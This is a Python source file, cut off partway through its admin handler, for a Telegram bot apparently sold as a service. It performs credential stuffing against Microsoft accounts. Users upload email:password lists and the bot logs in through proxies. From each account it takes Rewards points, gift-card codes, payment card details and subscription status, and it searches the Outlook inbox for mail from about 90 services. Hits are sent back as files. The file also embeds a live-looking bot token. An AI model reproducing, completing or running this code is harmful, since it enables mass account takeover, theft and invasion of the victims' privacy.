import re, json, uuid, sqlite3, logging, asyncio
import time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, ContextTypes, filters)
from telegram.constants import ParseMode

# ============================================================================
# LOGGING & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# SECTION 3 — CONFIG CONSTANTS
# ============================================================================
BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
ADMIN_ID = 5944410248
DB = "checker.db"
MAX_EXECUTOR_WORKERS = 500

SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

PROXIES_LIST = []
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

# ============================================================================
# SECTION 4 — AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), commit=True, fetchone=False, fetchall=False):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            try:
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            finally:
                conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')

    def add_user(self, uid, username, first_name):
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)',
                      (uid, username, first_name, datetime.now().isoformat()))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid):
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_banned']) if res else False

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res['is_banned']: return False
        if res['has_access'] == 0: return False
        if res['access_expiry']:
            if datetime.now() > datetime.fromisoformat(res['access_expiry']): return False
        return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_mod']) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res['credits'] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self):
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [row['user_id'] for row in res] if res else []

    def get_user_info(self, uid):
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return dict(res) if res else {}

    def get_user_settings(self, uid):
        res = self._execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res['threads']}
        return {'keywords': [], 'threads': 10}

    def update_settings(self, uid, keywords=None, threads=None):
        if keywords is not None:
            self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None:
            self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))

    def save_result(self, uid, email, status, details_dict):
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)',
                      (uid, email, status, json.dumps(details_dict), datetime.now().isoformat()))
        if status == 'hit':
            self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid):
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res['total_checks'], 'hits': res['total_hits'], 'credits': res['credits']} if res else {'checks':0,'hits':0,'credits':0}

    def get_global_stats(self):
        t = self._execute('SELECT COUNT(*) as total FROM users', fetchone=True)['total']
        a = self._execute('SELECT COUNT(*) as active FROM users WHERE has_access = 1 AND is_banned = 0', fetchone=True)['active']
        c = self._execute('SELECT SUM(total_checks) as checks FROM users', fetchone=True)['checks'] or 0
        h = self._execute('SELECT SUM(total_hits) as hits FROM users', fetchone=True)['hits'] or 0
        return {'total': t, 'active': a, 'checks': c, 'hits': h}

    def list_mods(self):
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': row['user_id'], 'username': row['username']} for row in res]

db_api = AkazaDatabase(DB)

# ============================================================================
# SECTION 5 — SERVICE_KEYWORDS DICT
# ============================================================================
SERVICE_KEYWORDS = {
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram", "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter", "x.com": "Twitter", "tiktok.com": "TikTok", "snapchat.com": "Snapchat", "discord.com": "Discord",
    "telegram.org": "Telegram", "reddit.com": "Reddit", "linkedin.com": "LinkedIn", "twitch.tv": "Twitch", "onlyfans.com": "OnlyFans",
    "patreon.com": "Patreon", "vk.com": "VK", "whatsapp.com": "WhatsApp", "youtube.com": "YouTube",
    "netflix.com": "Netflix", "spotify.com": "Spotify", "disneyplus.com": "Disney+", "hulu.com": "Hulu", "hbomax.com": "HBO Max",
    "amazon.com": "Amazon", "primevideo.com": "Amazon Prime", "apple.com": "Apple", "peacocktv.com": "Peacock",
    "paramountplus.com": "Paramount+", "tidal.com": "Tidal", "deezer.com": "Deezer", "xbox.com": "Xbox",
    "playstation.com": "PlayStation", "nintendo.com": "Nintendo", "steampowered.com": "Steam", "epicgames.com": "Epic Games",
    "riotgames.com": "Riot Games", "minecraft.net": "Minecraft", "roblox.com": "Roblox", "ubisoft.com": "Ubisoft",
    "ea.com": "EA Play", "blizzard.com": "Blizzard", "valorant.com": "Valorant", "fortnite.com": "Fortnite",
    "pubg.com": "PUBG", "cod.com": "Call of Duty", "rockstargames.com": "Rockstar", "paypal.com": "PayPal",
    "venmo.com": "Venmo", "cash.app": "CashApp", "stripe.com": "Stripe", "revolut.com": "Revolut",
    "wise.com": "Wise", "coinbase.com": "Coinbase", "binance.com": "Binance", "kraken.com": "Kraken",
    "robinhood.com": "Robinhood", "ebay.com": "eBay", "aliexpress.com": "AliExpress", "etsy.com": "Etsy",
    "walmart.com": "Walmart", "target.com": "Target", "shopify.com": "Shopify", "nike.com": "Nike",
    "adidas.com": "Adidas", "ubereats.com": "UberEats", "doordash.com": "DoorDash", "grubhub.com": "Grubhub",
    "deliveroo.co.uk": "Deliveroo", "uber.com": "Uber", "lyft.com": "Lyft", "airbnb.com": "Airbnb",
    "booking.com": "Booking.com", "expedia.com": "Expedia", "dropbox.com": "Dropbox", "google.com": "Google Drive",
    "microsoft.com": "OneDrive", "icloud.com": "iCloud", "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN",
    "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN", "coursera.org": "Coursera", "udemy.com": "Udemy",
    "duolingo.com": "Duolingo", "grammarly.com": "Grammarly", "office.com": "Office365", "zoom.us": "Zoom",
    "slack.com": "Slack", "adobe.com": "Adobe", "canva.com": "Canva"
}

# ============================================================================
# SECTION 6 — AkazaChecker CLASS
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            px = self.format_proxy(proxy)
            self.session.proxies = {'http': px, 'https': px}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        })

    def format_proxy(self, px):
        px = px.strip()
        if px.startswith(('http://', 'https://', 'socks')): return px
        parts = px.split(':')
        if len(parts) == 4: return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
        if len(parts) == 2: return f'http://{px}'
        return px

    def get_sftag_params(self):
        for _ in range(3):
            try:
                r = self.session.get(SFTAG_URL, timeout=10)
                ppft = (re.search('value=\\\\"(.+?)\\\\"', r.text, re.S) or re.search('value="(.+?)"', r.text, re.S) or
                        re.search("sFTTag:'(.+?)'", r.text, re.S) or re.search('sFTTag:"(.+?)"', r.text, re.S) or
                        re.search('name="PPFT".*?value="(.+?)"', r.text, re.S))
                up = (re.search('"urlPost":"(.+?)"', r.text, re.S) or re.search("urlPost:'(.+?)'", r.text, re.S) or
                      re.search('<form.*?action="(.+?)"', r.text, re.S))
                if ppft and up: return up.group(1).replace('&amp;', '&'), ppft.group(1)
            except: pass
            time.sleep(0.1)
        return None, None

    def do_login(self, email, password, up, pp):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': pp}
                r = self.session.post(up, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}, allow_redirects=True, timeout=10)
                if '#' in r.url and r.url != SFTAG_URL:
                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]
                    if tk and tk != 'None': return 'TOKEN', tk
                if 'cancel?mkt=' in r.text:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', r.text)
                    if ipt and pprid and uaid:
                        act = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
                        if act:
                            ret = self.session.post(act.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=10)
                            ru = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if ru:
                                fin = self.session.get(ru.group(), allow_redirects=True, timeout=10)
                                tk = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                if tk and tk != 'None': return 'TOKEN', tk
                    return '2FA', None
                if any(v in r.text for v in ['recover?mkt', 'identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=', 'recover.live.com']): return '2FA', None
                low = r.text.lower()
                if any(v in low for v in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'too many times', 'help us protect', 'sign in to your microsoft account']): return 'BAD', None
            except: pass
        return 'ERROR', None

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
            if not form: break
            act = form.get('action')
            if act.startswith('/'): act = 'https://login.live.com' + act
            data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
            resp = self.session.post(act, data=data, timeout=10, allow_redirects=True)
        return resp

    def get_rewards_points(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=8)
            if r.status_code == 200:
                d = r.json()
                pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None: return int(pts)
        except: pass
        try:
            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", timeout=8)
            if r.status_code == 200:
                d = r.json()
                if 'userInfo' in d and 'balance' in d['userInfo']: return int(d['userInfo']['balance'])
        except: pass
        try:
            r = self.session.get("https://rewards.bing.com", timeout=10)
            r = self.handle_fmhf(r)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m:
                pts = int(m.group(1))
                if 0 <= pts <= 500000: return pts
        except: pass
        return 0

    def detect_category(self, title, row_text=''):
        t = (title + row_text).lower()
        if 'overwatch' in t: return 'Overwatch'
        if any(v in t for v in ['sea of thieves', 'ancient coins']): return 'Sea of Thieves'
        if any(v in t for v in ['roblox', 'robux']): return 'Roblox'
        if any(v in t for v in ['league of legends', 'riot points']): return 'League of Legends'
        if any(v in t for v in ['game pass', 'gamepass']): return 'Game Pass'
        if any(v in t for v in ['minecraft', 'minecoins']): return 'Minecraft'
        if any(v in t for v in ['gift card', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'spotify']): return 'Gift Card'
        return 'Unknown'

    def get_redemption_codes(self):
        codes = []
        try:
            r = self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10)
            if 'fmHF' in r.text or 'JavaScript required' in r.text: r = self.handle_fmhf(r)
            soup = BeautifulSoup(r.text, 'html.parser')
            v_tag = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = v_tag.get('value', '') if v_tag else ''
            tbl = soup.find('table', class_='table')
            rows = tbl.find_all('tr') if tbl else []
            excl = {'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'POINTS', 'DONATION', 'MICROSOFT'}
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title = cells[2].get_text(strip=True)
                date = cells[1].get_text(strip=True)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                code, red_url = None, None
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10)
                    ch = cr.text
                    m = (re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', ch) or
                         re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', ch) or
                         re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', ch))
                    if m: code = m.group()
                    rm = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', ch)
                    if rm: red_url = rm.group(1)
                else:
                    target = cells[3] if len(cells) > 3 else cells[2]
                    m = (re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', target.text) or
                         re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', target.text) or
                         re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', target.text))
                    if m: code = m.group()
                if code and not any(e in code.upper() for e in excl):
                    codes.append({'code': code, 'category': self.detect_category(title, row.get_text()), 'info': title, 'redemption_url': red_url, 'date': date})
        except: pass
        return codes

    def get_microsoft_subs(self):
        try:
            uid = uuid.uuid4().hex[:16]
            st = json.dumps({"userId": uid, "scopeSet":"pidl"})
            u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth&state={quote(st)}&prompt=none"
            r = self.session.get(u, headers={'Referer': 'https://account.microsoft.com/'}, timeout=20)
            tk = (re.search(r'access_token=([^&\s"\']+)', r.text) or re.search(r'access_token=([^&\s"\']+)', r.url))
            if not tk: return {"status":"FREE","subs":[]}
            ptk = unquote(tk.group(1))
            h = {"Authorization": f'MSADELEGATE1.0="{ptk}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
            rb = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=h, timeout=15).text
            bal = re.search(r'"balance"\s*:\s*([0-9.]+)', rb)
            card = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', rb, re.S)
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=15).text
            kw = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS', 'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD', 'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL', 'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
            subs = []
            for k, v in kw.items():
                if k in rt:
                    rm = re.search(f'"{k}".*?"nextRenewalDate"\\s*:\\s*"([^T"]+)', rt, re.S)
                    days = -1
                    if rm:
                        try:
                            expiry_date = datetime.fromisoformat(rm.group(1)).date()
                            days = (expiry_date - datetime.now().date()).days
                        except: pass
                    subs.append({'name': v, 'is_expired': days < 0})
            return {"status": "PREMIUM" if any(not s['is_expired'] for s in subs) else "FREE", "subs": subs, "balance": f"${bal.group(1)}" if bal else None, "card": card.group(1) if card else None}
        except: return {"status":"FREE","subs":[]}

    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=15).json()
            name = r.get('displayName', '')
            loc = r.get('location', {})
            cty = r.get('country') or loc.get('country') or loc.get('countryOrRegion') or ''
            return name, cty
        except: return '', ''

    def get_minecraft(self, tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={tk}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}).json()
            xtk, uhs = r1['Token'], r1['DisplayClaims']['xui'][0]['uhs']
            xst = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xtk]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}).json()['Token']
            mt = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken": f"XBL3.0 x={uhs};{xst}"}).json()['access_token']
            pr = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization": f"Bearer {mt}"})
            if pr.status_code == 200:
                pj = pr.json()
                return {"owned": True, "username": pj['name'], "uuid": pj['id'], "capes": [c['alias'] for c in pj.get('capes', [])]}
        except: pass
        return {"owned": False}

    def scan_inbox(self, tk, cid, uk):
        comb = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
        res = {}
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        for i in range(0, len(comb), 8):
            batch = comb[i:i+8]
            qs = " OR ".join([f'"{k}"' for k in batch])
            pay = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": qs}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=pay, headers=h, timeout=15)
                if r.status_code == 200 and r.json()['EntitySets'][0]['ResultSets'][0]['Total'] > 0:
                    for k in batch:
                        p2 = pay.copy()
                        p2['EntityRequests'][0]['Query']['QueryString'] = f'"{k}"'
                        r2 = self.session.post("https://outlook.live.com/search/api/v2/query", json=p2, headers=h, timeout=10)
                        tot = r2.json()['EntitySets'][0]['ResultSets'][0]['Total']
                        if tot > 0: res[SERVICE_KEYWORDS.get(k, k)] = tot
            except: pass
        return res

    async def check(self, email, password, uk=[]):
        loop = asyncio.get_running_loop()
        up, pp = await loop.run_in_executor(bot_executor, self.get_sftag_params)
        if not up: return {'status': 'error'}
        st, tk = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, pp)
        if st != 'TOKEN': return {'status': st.lower()}
        cid = ''
        for c in self.session.cookies:
            if c.name == 'MSPCID':
                cid = c.value.upper()
                break
        tasks = [
            loop.run_in_executor(bot_executor, self.get_rewards_points),
            loop.run_in_executor(bot_executor, self.get_redemption_codes),
            loop.run_in_executor(bot_executor, self.get_microsoft_subs),
            loop.run_in_executor(bot_executor, self.get_profile, tk, cid),
            loop.run_in_executor(bot_executor, self.get_minecraft, tk),
            loop.run_in_executor(bot_executor, self.scan_inbox, tk, cid, uk)
        ]
        results = await asyncio.gather(*tasks)
        return {
            'status': 'hit', 'email': email, 'password': password,
            'pts': results[0], 'codes': results[1], 'subs': results[2],
            'name': results[3][0], 'country': results[3][1],
            'mc': results[4], 'inbox': results[5]
        }

# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db_api.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db_api.is_banned(uid): return
    kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("🌐 Proxies", callback_data="proxy")]]
    if db_api.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    await u.message.reply_text("💠 <b>AKAZA Bot</b> 💠", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db_api.is_banned(uid) or not db_api.has_access(uid): return
    text = u.message.text
    if u.message.document:
        doc = await c.bot.get_file(u.message.document.file_id)
        text = (await doc.download_as_bytearray()).decode('utf-8', 'ignore')
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return
    s = db_api.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)
    msg = await u.message.reply_text("🚀 Initializing...")
    hits, khits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, 0, time.time(), 0, []
    ts = int(time.time()); h_f = f"hits_@larpsupport_{uid}_{ts}.txt"; kh_f = f"keyword_hits_@larpsupport_{uid}_{ts}.txt"; tfa_f = f"tfa_@larpsupport_{uid}.txt"
    sem = asyncio.Semaphore(thr); up_lock = asyncio.Lock()
    async def worker(line):
        nonlocal hits, khits, bad, tfa, err, checked, last_up
        async with sem:
            try:
                e_p = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(e_p[0].strip(), e_p[1].strip(), s['keywords'])
            except: data = {'status': 'error'}
            checked += 1; db_api.use_credit(uid); db_api.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                has_kw = bool(data.get('inbox'))
                if has_kw: khits += 1
                else: hits += 1
                last_h.append(data['email'])
                if len(last_h) > 5: last_h.pop(0)
                file_path = kh_f if has_kw else h_f
                with open(file_path, 'a', encoding='utf-8') as f:
                    if os.path.getsize(file_path) == 0: f.write("@larpsupport\n\n")
                    f.write(f"Account: {data['email']}:{data['password']}\nPoints: {data['pts']}\nInbox: {json.dumps(data.get('inbox', {}))}\n" + "-"*30 + "\n\n")
            elif st == '2fa':
                tfa += 1
                with open(tfa_f, 'a', encoding='utf-8') as f: f.write(f"{data.get('email','')}:{data.get('password','')}\n")
            elif st == 'error': err += 1
            else: bad += 1
            async with up_lock:
                if time.time() - last_up > 3 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 🔑 Keywords: `{khits}`\n💀 Bad: `{bad}` | 🔒 2FA: `{tfa}`\n\n🕒 Last Hits:\n`{' | '.join(last_h) or 'None'}`"
                    try: await msg.edit_text(prg, parse_mode='Markdown')
                    except: pass
    await asyncio.gather(*(worker(l) for l in lines))
    if uid in user_proxies: del user_proxies[uid]
    for p in [h_f, kh_f, tfa_f]:
        if os.path.exists(p) and os.path.getsize(p) > 10:
            with open(p, 'a', encoding='utf-8') as f: f.write("\n@larpsupport")
            await u.message.reply_document(open(p, 'rb'), caption=f"✅ {os.path.basename(p)}")
            os.remove(p)
    if hits == 0 and khits == 0: await u.message.reply_text("✅ Check finished. No hits found.")

async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    doc = await c.bot.get_file(u.message.document.file_id)
    text = (await doc.download_as_bytearray()).decode('utf-8', 'ignore')
    user_proxies[uid] = [l.strip() for l in text.splitlines() if l.strip()]
    await u.message.reply_text(f"✅ Loaded {len(user_proxies[uid])} proxies (one-time use).")

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "settings":
        s = db_api.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ Threads: `{s['threads']}`\n/threads N to change.\nKeywords: `{len(s['keywords'])}`", parse_mode='Markdown')
    elif q.data == "stats":
        st = db_api.user_stats(uid)
        await q.edit_message_text(f"📊 Checks: `{st['checks']}`\nHits: `{st['hits']}`\nCredits: Unlimited", parse_mode='Markdown')
    elif q.data == "proxy": await q.edit_message_text(f"🌐 Proxies: `{len(user_proxies.get(uid, []))}`\nUpload .txt with 'prox' in caption.", parse_mode='Markdown')
    elif q.data == "admin" and db_api.is_mod(uid):
        st = db_api.get_global_stats()
        await q.edit_message_text(f"🛠 Admin Stats\nTotal Users: `{st['total']}`\nActive: `{st['active']}`\nChecks: `{st['checks']}`\nHits: `{st['hits']}`", parse_mode='Markdown')
    elif q.data == "back":
        kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
               [InlineKeyboardButton("🌐 Proxies", callback_data="proxy")]]
        if db_api.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
        await q.edit_message_text("💠 <b>AKAZA Bot</b> 💠", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        try:
            n = int(c.args[0])
            if 1 <= n <= 300: db_api.update_settings(u.effective_user.id, threads=n); await u.message.reply_text(f"✅ Threads set to {n}.")
        except: pass

async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        kws = [k.strip() for k in " ".join(c.args).split(',')]
        db_api.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Set {len(kws)} keywords.")

async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): await u.message.reply_text("✅ Stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): db_api.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Cleared.")

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db_api.is_mod(uid): return
    txt = u.message.text; args = c.args
